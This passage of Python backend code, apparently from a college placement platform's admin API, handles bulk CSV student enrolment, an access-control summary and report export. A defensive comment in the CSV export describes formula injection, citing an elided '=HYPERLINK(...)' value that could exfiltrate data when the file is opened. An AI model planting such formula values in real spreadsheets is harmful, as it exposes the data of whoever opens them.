        yrs = {r["year_name"].lower(): str(r["id"]) for r in await conn.fetch(
            "SELECT id, year_name FROM college_years WHERE organization_id = $1", org_id)}
        bats = {r["batch_name"].lower(): str(r["id"]) for r in await conn.fetch(
            "SELECT id, batch_name FROM college_batches WHERE organization_id = $1", org_id)}

        # ✅ FIXED: N+1 query elimination. Previously: 2 DB calls per CSV row
        # (profiles lookup + org membership check) = 2 × N queries in series.
        # A 500-row CSV = 1000 sequential DB calls — will timeout under any load.
        # Fix: pre-load ALL relevant emails into memory in 2 bulk queries, then
        # resolve rows entirely in Python with zero additional DB reads per row.
        all_emails = [
            (row.get("email") or "").strip().lower()
            for row in rows
            if (row.get("email") or "").strip()
        ]
        # Bulk fetch: email → user_id for all emails in the CSV
        profile_rows = await conn.fetch(
            "SELECT id, email FROM profiles WHERE LOWER(email) = ANY($1::text[])",
            all_emails,
        )
        email_to_user_id: dict[str, str] = {
            r["email"].lower(): str(r["id"]) for r in profile_rows
        }

        # Bulk fetch: user_id → True for all already-enrolled users in this org
        enrolled_rows = await conn.fetch(
            """SELECT user_id FROM organization_students
               WHERE organization_id = $1 AND user_id = ANY($2::uuid[])""",
            org_id,
            list(email_to_user_id.values()),
        )
        already_enrolled: set[str] = {str(r["user_id"]) for r in enrolled_rows}

        success, failed, granted = 0, [], 0
        # All writes inside a single transaction — partial bulk upload is rolled back
        # cleanly rather than leaving the DB in a half-imported state.
        async with conn.transaction():
            for i, row in enumerate(rows, 1):
                email = (row.get("email") or "").strip()
                errors = []
                if not email:
                    errors.append("Missing email")
                student_id = (row.get("student_id") or "").strip()
                dept_name = (row.get("department") or "").strip().lower()
                year_name = (row.get("year") or "").strip().lower()
                batch_name = (row.get("batch") or "").strip().lower()

                if not student_id:
                    errors.append("Missing student ID")
                if not dept_name:
                    errors.append("Missing department")
                if not batch_name:
                    errors.append("Missing batch")

                dept_id = depts.get(dept_name)
                year_id = yrs.get(year_name)
                batch_id = bats.get(batch_name)
                if dept_name and not dept_id:
                    errors.append(f"Department '{row.get('department','')}' not found")
                if year_name and not year_id:
                    errors.append(f"Year '{row.get('year','')}' not found")
                if batch_name and not batch_id:
                    errors.append(f"Batch '{row.get('batch','')}' not found")

                if errors:
                    failed.append({"row": i, "email": email, "errors": errors})
                    continue

                # ✅ Pure Python lookups — zero DB calls per row
                user_id = email_to_user_id.get(email.lower())
                if not user_id:
                    failed.append({"row": i, "email": email, "errors": ["No PrepVista account found"]})
                    continue
                if user_id in already_enrolled:
                    failed.append({"row": i, "email": email, "errors": ["Already in organization"]})
                    continue
                if available <= 0:
                    failed.append({"row": i, "email": email, "errors": ["Seat limit reached"]})
                    continue

                grant_str = (row.get("grant_career_access") or "").strip().lower()
                grant = grant_str not in ("false", "no", "0")
                access_at = datetime.now(timezone.utc) if grant else None
                await conn.execute(
                    """INSERT INTO organization_students
                       (organization_id, user_id, student_code, department_id, year_id, batch_id,
                        section, has_career_access, access_granted_at, access_granted_by, notes)
                       VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11)""",
                    org_id, user_id, student_id or None,
                    dept_id, year_id, batch_id, (row.get("section") or "").strip() or None,
                    grant, access_at, admin.user_id if grant else None,
                    (row.get("notes") or "").strip() or None)
                await conn.execute("UPDATE organizations SET seats_used = seats_used + 1 WHERE id = $1", org_id)
                if grant:
                    await conn.execute("UPDATE profiles SET plan = $1, org_student = TRUE, organization_id = $2 WHERE id = $3",
                                       COLLEGE_STUDENT_PLAN, org_id, user_id)
                    granted += 1
                else:
                    await conn.execute("UPDATE profiles SET org_student = TRUE, organization_id = $1 WHERE id = $2", org_id, user_id)
                # Mark as enrolled so duplicate rows in the same CSV are caught
                already_enrolled.add(user_id)
                success += 1
                available -= 1

        await _log_action(conn, org_id, admin.user_id, "bulk_add",
                          metadata={"success": success, "failed": len(failed), "granted": granted})

    return {
        "total_rows": len(rows), "success": success, "failed_count": len(failed),
        "career_access_granted": granted, "failed_rows": failed,
    }


# ── Access Control ───────────────────────────────────
@router.get("/access-control")
async def access_control_summary(
    admin: OrgAdminProfile = Depends(require_org_admin()),
    page: int = 1,
    page_size: int = ORG_DEFAULT_PAGE_SIZE,
):
    org_id = admin.organization_id
    ps, offset = _paginate(page, page_size)
    async with DatabaseConnection() as conn:
        org = await conn.fetchrow("SELECT seat_limit, seats_used FROM organizations WHERE id = $1", org_id)
        total_seats = org["seat_limit"] if org else 0
        used = org["seats_used"] if org else 0
        access_count = await conn.fetchval(
            "SELECT COUNT(*) FROM organization_students WHERE organization_id=$1 AND has_career_access=TRUE AND status='active'", org_id)
        # ✅ FIXED: Was LIMIT 100 — silently truncated colleges with >100 students
        # without any indication to the admin that data was missing. Replaced with
        # proper pagination so all students are accessible.
        no_access = await conn.fetch(
            """SELECT os.id, os.student_code, p.email, p.full_name,
                      cd.department_name, cy.year_name, cb.batch_name
               FROM organization_students os JOIN profiles p ON p.id = os.user_id
               LEFT JOIN college_departments cd ON cd.id = os.department_id
               LEFT JOIN college_years cy ON cy.id = os.year_id
               LEFT JOIN college_batches cb ON cb.id = os.batch_id
               WHERE os.organization_id=$1 AND os.has_career_access=FALSE AND os.status='active'
               ORDER BY os.added_at DESC LIMIT $2 OFFSET $3""",
            org_id, ps, offset)
        with_access = await conn.fetch(
            """SELECT os.id, os.student_code, os.access_granted_at, os.access_expires_at,
                      p.email, p.full_name, cd.department_name, cy.year_name, cb.batch_name
               FROM organization_students os JOIN profiles p ON p.id = os.user_id
               LEFT JOIN college_departments cd ON cd.id = os.department_id
               LEFT JOIN college_years cy ON cy.id = os.year_id
               LEFT JOIN college_batches cb ON cb.id = os.batch_id
               WHERE os.organization_id=$1 AND os.has_career_access=TRUE AND os.status='active'
               ORDER BY os.access_granted_at DESC LIMIT $2 OFFSET $3""",
            org_id, ps, offset)
        recent_log = await conn.fetch(
            """SELECT oal.*, p1.email AS student_email FROM organization_access_log oal
               LEFT JOIN profiles p1 ON p1.id = oal.student_user_id
               WHERE oal.organization_id=$1 AND oal.action IN ('grant_access','revoke_access')
               ORDER BY oal.created_at DESC LIMIT 50""", org_id)
    return {
        "total_seats": total_seats, "used_seats": used, "available_seats": total_seats - used,
        "career_access_count": access_count,
        "students_without_access": [dict(r) for r in no_access],
        "students_with_access": [dict(r) for r in with_access],
        "recent_access_log": [dict(r) for r in recent_log],
        "page": page, "page_size": ps,
    }


# ── Reports Export ───────────────────────────────────
@router.get("/reports/export")
async def export_student_reports(
    department_id: str | None = None,
    year_id: str | None = None,
    batch_id: str | None = None,
    export_format: str = "json",  # ✅ FIXED: renamed from 'format' — shadows Python built-in
    admin: OrgAdminProfile = Depends(require_org_admin()),
):
    org_id = admin.organization_id
    async with DatabaseConnection() as conn:
        where = ["os.organization_id = $1", "os.status != 'removed'"]
        params: list = [org_id]
        idx = 1
        if department_id:
            idx += 1; where.append(f"os.department_id = ${idx}"); params.append(department_id)
        if year_id:
            idx += 1; where.append(f"os.year_id = ${idx}"); params.append(year_id)
        if batch_id:
            idx += 1; where.append(f"os.batch_id = ${idx}"); params.append(batch_id)
        w = " AND ".join(where)
        # ✅ PERF: Previously 4 correlated subqueries per student row (total_interviews,
        # avg_score, best_score, last_activity). A college with 300 students = 1200
        # subquery executions per export call — brutal on the DB under concurrent load.
        # Replaced with a single pre-aggregated subquery joined once — O(1) extra scan.
        rows = await conn.fetch(
            f"""SELECT p.full_name, p.email, os.student_code,
                       cd.department_name, cy.year_name, cb.batch_name, os.section,
                       os.has_career_access, os.access_granted_at, os.status, os.added_at,
                       COALESCE(si.total_interviews, 0)  AS total_interviews,
                       si.avg_score,
                       si.best_score,
                       si.last_activity
                FROM organization_students os
                JOIN profiles p ON p.id = os.user_id
                LEFT JOIN college_departments cd ON cd.id = os.department_id
                LEFT JOIN college_years cy ON cy.id = os.year_id
                LEFT JOIN college_batches cb ON cb.id = os.batch_id
                LEFT JOIN (
                    SELECT user_id,
                           COUNT(*)                          AS total_interviews,
                           ROUND(AVG(final_score)::numeric, 1) AS avg_score,
                           MAX(final_score)                  AS best_score,
                           MAX(created_at)                   AS last_activity
                    FROM interview_sessions
                    GROUP BY user_id
                ) si ON si.user_id = os.user_id
                WHERE {w} ORDER BY p.full_name""",
            *params,
        )

    if export_format == "csv":
        output = io.StringIO()
        writer = csv.writer(output)
        writer.writerow(["Name", "Email", "Student ID", "Department", "Year", "Batch", "Section",
                          "Career Access", "Access Granted", "Status", "Joined",
                          "Total Interviews", "Avg Score", "Best Score", "Last Activity"])
        for r in rows:
            # ✅ SEC: _sanitize_csv_cell() prevents CSV formula injection (A1 injection).
            # Every user-controlled field (name, email, student_code, dept, etc.) is
            # sanitized before writing. A student named '=HYPERLINK(...)' would execute
            # as a formula in Excel/Google Sheets and exfiltrate data when the TPO opens
            # the file. OWASP rates this as high severity for data export endpoints.
            writer.writerow([
                _sanitize_csv_cell(r["full_name"]),
                _sanitize_csv_cell(r["email"]),
                _sanitize_csv_cell(r["student_code"]),
                _sanitize_csv_cell(r["department_name"]),
                _sanitize_csv_cell(r["year_name"]),
                _sanitize_csv_cell(r["batch_name"]),
                _sanitize_csv_cell(r["section"]),
                "Yes" if r["has_career_access"] else "No",
                _sanitize_csv_cell(r["access_granted_at"]),
                _sanitize_csv_cell(r["status"]),
                _sanitize_csv_cell(r["added_at"]),
                _sanitize_csv_cell(r["total_interviews"]),
                _sanitize_csv_cell(r["avg_score"]),
                _sanitize_csv_cell(r["best_score"]),
                _sanitize_csv_cell(r["last_activity"]),
            ])
        output.seek(0)
        return StreamingResponse(
            io.BytesIO(output.getvalue().encode("utf-8")),
            media_type="text/csv",
            headers={"Content-Disposition": f"attachment; filename=students_report_{org_id[:8]}.csv"},
        )

    return {"students": [dict(r) for r in rows], "total": len(rows)}